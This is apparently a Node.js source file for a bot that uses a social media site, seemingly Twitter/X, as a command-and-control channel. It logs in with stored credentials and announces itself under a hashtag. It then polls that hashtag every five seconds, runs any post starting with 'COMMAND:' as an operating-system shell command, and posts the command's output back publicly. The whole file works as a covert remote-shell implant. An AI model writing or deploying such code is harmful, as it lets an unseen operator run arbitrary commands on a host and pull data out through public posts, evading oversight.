require('dotenv').config();
const path = require('path');
const { exec } = require('child_process');

const { login, acceptCookies } = require('./lib/login.js');
const Commands = require('./lib/commands.js');
const { log, sleep } = require('../utils/utils.js');
const { URLS, COMMANDS, COMMUNICATION } = require('../config/constants.js');
const MESSAGES = require('../config/messages.js');
const { clear } = require('console');

USER = process.env.BOT_EMAIL;
PASS = process.env.BOT_PASSWORD;
VERIFICATION = process.env.BOT_VERIFICATION;
BROWSER = process.env.BROWSER;
HEADLESS = process.env.HEADLESS == "true" ? "new" : false;
TOPIC = process.env.TOPIC;

const nextAction = () => {
	log(MESSAGES.EMPTY);
	sleep(COMMANDS.DELAY);
}

// run bot
(async () => {
	log(MESSAGES.STARTING.format(path.basename(__filename).replace(".js", "")));

	const page = await login(USER, PASS, VERIFICATION, URLS.LOGIN, BROWSER, HEADLESS);
	page.setDefaultNavigationTimeout(999999); 
	nextAction();
	await acceptCookies(page);
	nextAction();

	const commands = new Commands(page);

	// open communication channel and pass timestamp
	await commands.makePost(`${COMMUNICATION.OPEN} [${Date.now()}]`, [`#${TOPIC}`]);
	nextAction();

	// wait for command from commander
	const run = setInterval(async () => {
		log(MESSAGES.COMMAND_WAITING);
		commands.page.goto(`${URLS.TOPIC.format(TOPIC)}?f=live`, {waitUntil: 'networkidle2'});

		// within this hashtag page, check if the bot has opened a session
		const latest = await commands.getTimelinePost(1);
		let content = await commands.getPostContent(latest);

		// remove topic hashtag from content
		content = content.replace(`#${TOPIC}`, "").trim();

		// check if tweet is a command
		if (content.startsWith("COMMAND:")) {
			const command = content.replace("COMMAND:", "").trim().split("[")[0];
			log(MESSAGES.COMMAND_RECEIVED.format(command));

			clearInterval(run);

			// execute command on os
			exec(command, async (err, stdout, stderr) => {
				if (err) {
					log(err);
					return;
				}

				log(stdout);
				stdout = "OUTPUT: " + stdout + `[${Date.now()}]`;
				await commands.makePost(stdout, [`#${TOPIC}`]);
				nextAction();
			});
		}
	}, 5000);
})();